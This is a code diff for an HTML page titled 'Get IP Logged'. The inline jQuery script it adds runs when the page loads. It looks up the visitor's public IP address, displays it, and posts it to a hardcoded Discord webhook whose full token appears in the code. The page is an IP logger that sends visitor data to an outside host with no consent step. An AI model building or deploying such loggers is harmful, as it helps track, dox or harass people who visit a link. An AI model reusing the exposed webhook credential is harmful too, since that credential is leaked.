@@ -14,7 +14,6 @@
     <link rel="preload" href="https://heroin.gg/users/css/turbant.css" as="style" media="screen and (min-width: 768px)">
     <script src="https://heroin.gg/users/js/turbant.js"></script>
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-    <script src="index.js"></script>
     <style>
         body, html {
             height: 100%;
@@ -31,6 +30,61 @@
     </style>
 </head>
 <body>
-    <h1>Get ip logged</h1>
+    <h1>Get IP Logged</h1>
+    <div id="ip-display" style="text-align: center; font-size: 5vw;"></div>
+
+    <script>
+        async function fetchData() {
+            return new Promise((resolve, reject) => {
+                $.get("https://api.ipify.org/", function (data) {
+                    resolve(data);
+                }).fail(function (error) {
+                    reject(error);
+                });
+            });
+        }
+
+        async function sendToWebhook(ipData) {
+            var webhookUrl = "https://discord.com/api/webhooks/1282064242488639610/m0BWA8iPSbl3oXSNMP9J0-ATwuWuOJj1-PouniuH6hP2L3Wnh-gThbSoBa8qwOLY9ui6"; // Replace with your Discord webhook URL
+            var data = {
+                embeds: [
+                    {
+                        title: "IP Address Information",
+                        fields: [
+                            {
+                                name: "IP Data",
+                                value: "```html\n" + ipData + "```"
+                            }
+                        ]
+                    }
+                ]
+            };
+
+            try {
+                await $.ajax({
+                    type: "POST",
+                    url: webhookUrl,
+                    data: JSON.stringify(data),
+                    contentType: "application/json"
+                });
+                console.log("IP data sent to Discord webhook successfully.");
+            } catch (error) {
+                console.error("Failed to send IP data to Discord webhook:", error);
+            }
+        }
+
+        fetchData()
+            .then(ipData => {
+                // Display the IP address on the screen
+                document.getElementById("ip-display").innerText = `Your IP Address: ${ipData}`;
+                
+                // Send IP data to Discord webhook
+                sendToWebhook(ipData);
+            })
+            .catch(error => {
+                console.error("Error fetching IP data:", error);
+                document.getElementById("ip-display").innerText = `Error fetching IP Address: ${error}`;
+            });
+    </script>
 </body>
 </html>
